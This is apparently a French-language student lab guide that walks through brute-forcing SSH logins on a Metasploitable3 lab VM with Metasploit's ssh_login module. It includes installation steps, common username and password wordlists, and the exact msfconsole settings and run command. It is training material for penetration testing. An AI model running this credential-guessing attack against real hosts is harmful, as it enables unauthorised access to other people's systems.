## LAB6 - PARTIE2 - Configuration et Utilisation de Metasploit pour Attaque par Force Brute SSH

# 1 -  Description
Ce document fournit des instructions détaillées pour utiliser Metasploit afin de lancer une attaque par force brute SSH contre une machine cible, en l'occurrence Metasploitable3. Ce guide couvre la préparation des fichiers nécessaires, la configuration de Metasploit, et le lancement de l'attaque.

# 2 -  Prérequis
- Un ordinateur ou une machine virtuelle avec Ubuntu 22.04 installé.
- Accès à un compte avec des privilèges d'administrateur.
- **Système d'exploitation**: Linux (Ubuntu 22.04 préféré)
- **Metasploit Framework installé**
- **Accès administratif sur la machine où Metasploit est installé**
- **Machine cible configurée et accessible sur le réseau**

# 3 - Ajout de l'Utilisateur `eleve` au Fichier sudoers
1. **Ouvrez un terminal.**
2. Devenez superutilisateur pour modifier les fichiers de configuration système:
   ```bash
   su
   ```
3. Éditez le fichier sudoers pour ajouter des privilèges administratifs à `eleve`:
   ```bash
   visudo
   ```
4. Ajoutez la ligne suivante pour donner à `eleve` les droits sudo:
   ```
   eleve ALL=(ALL) ALL
   ```
5. **Enregistrez et quittez** l'éditeur. Utilisez `CTRL+X`, suivi de `Y` pour enregistrer si vous utilisez `nano` comme éditeur dans `visudo`.

6. Tapez `exit` pour retourner à la session de l'utilisateur `eleve`.

# Remarque IMPORTANTE #1:  root
- Il ne faut pas utiliser un root user étant donné que c'est bloquant ! C'est pour cette raison j'utilise eleve.
# Remarque IMPORTANTE #2:  permissions
- Déplacez les fichiers dans un répertoire où Metasploit a les permissions de lecture.
  ```bash
  sudo mv /home/eleve/usernames.txt /snap/metasploit-framework/
    ```
# 4 - (MÉTHODE#1) Installation de Metasploit (si non installé)

1. Ouvrez un terminal.
2. Exécutez les commandes suivantes pour installer Metasploit:
   ```bash
   sudo apt update
   sudo apt install metasploit-framework
   ```
# 4 - (MÉTHODE#2) Installation de Metasploit Framework
1. **Ouvrez un terminal sous le compte `eleve`.**
2. Mettez à jour les paquets et installez les dépendances:
   ```bash
   sudo apt update
   sudo apt install curl gnupg2 software-properties-common
   ```
3. **Ajoutez le dépôt officiel de Metasploit**:
   ```bash
   curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
   chmod 755 msfinstall
   sudo ./msfinstall
   ```
4. **Vérifiez l'installation** en démarrant Metasploit:
   ```bash
   msfconsole
   ```
# 4 - (MÉTHODE#3) Installation de Metasploit (si non installé)

1. Ouvrez un terminal.
2. Exécutez les commandes suivantes pour installer Metasploit:

```bash
     sudo apt update
     snap install metasploit-framework
 ```


# 5 - Étape 1: Préparation des Fichiers de Noms d'Utilisateurs et de Mots de Passe
1. **Création des fichiers** :
   - Créez les fichiers contenant les noms d'utilisateurs et les mots de passe que vous prévoyez d'utiliser pour l'attaque.
     ```bash
     echo -e "root\nadmin\nuser\ntest\nguest\ninfo\noperator" > /home/eleve/usernames.txt
     echo -e "password\n123456\nadmin\nguest\n123123\npassword1\nqwerty\n12345\n123456789\ntest" > /home/eleve/passwords.txt
     ```

2. **Modification des permissions** :
   - Assurez-vous que les fichiers sont lisibles.
     ```bash
     chmod 644 /home/eleve/usernames.txt
     chmod 644 /home/eleve/passwords.txt
     ```

3. **Changement de propriétaire** :
   - Changez le propriétaire des fichiers pour garantir que Metasploit peut y accéder.
     ```bash
     sudo chown $(whoami) /home/eleve/usernames.txt
     sudo chown $(whoami) /home/eleve/passwords.txt
     ```

# 6 - Étape 2: Déplacement des Fichiers dans un Répertoire Accessible par Metasploit
- Déplacez les fichiers dans un répertoire où Metasploit a les permissions de lecture.
  ```bash
  sudo mv /home/eleve/usernames.txt /snap/metasploit-framework/
  sudo mv /home/eleve/passwords.txt /snap/metasploit-framework/
  ```

# 7 - Étape 3: Configuration de Metasploit

1. ** Initialisation de la Base de Données Metasploit
- Initialisez la base de données PostgreSQL pour Metasploit** (ce qui améliore les performances de Metasploit et permet la persistance des données entre les sessions):
   ```bash
   msfdb init
   ```
2. **Lancement de Metasploit** :
   - Ouvrez Metasploit en utilisant la commande suivante :
     ```bash
     msfconsole
     ```

3. **Configuration du module SSH** :
   - Configurez Metasploit pour utiliser les fichiers déplacés et ciblez la machine appropriée.
     ```bash
     use auxiliary/scanner/ssh/ssh_login
     set RHOSTS 172.28.128.3
     set USER_FILE /snap/metasploit-framework/usernames.txt
     set PASS_FILE /snap/metasploit-framework/passwords.txt
     set VERBOSE true
     ```
## Remarque : 172.28.128.3 est l'adresse de la machine metasploitable3 (host only adapter regardez le lab précédent ) dans mon cas


# 7 -  Étape 4: Lancement de l'Attaque
- Exécutez le module pour commencer l'attaque.
  ```bash
  run
  ```

### Conseils de Sécurité
- **Permissions**: Vérifiez régulièrement que les permissions des fichiers sont correctement configurées pour éviter tout accès non autorisé.
- **Légalité**: Assurez-vous d'avoir l'autorisation explicite de tester la machine cible. L'utilisation de Metasploit sans consentement est illégale.

### Dépannage
- Si des problèmes surviennent, vérifiez les logs de Metasploit pour des détails sur les erreurs. Assurez-vous que les chemins des fichiers sont corrects et que les fichiers ne sont pas corrompus.

---

Ce document devrait vous fournir une base solide pour l'utilisation sécurisée et efficace de Metasploit dans vos tests de pénétration. Assurez-vous de suivre les meilleures pratiques de sécurité et de conformité légale lors de vos tests.
